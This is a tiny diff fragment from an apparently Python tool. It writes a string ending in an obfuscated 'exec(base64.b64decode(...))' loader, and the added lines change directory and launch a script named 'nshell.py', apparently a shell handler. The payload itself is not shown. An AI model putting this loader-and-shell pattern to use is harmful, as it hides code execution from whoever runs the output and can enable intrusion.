@@ -24,3 +24,5 @@ import base64
 import time
 
 exec(base64.b64decode(cod))""")
+os.chdir("../nshell/")
+os.system("python3 nshell.py")
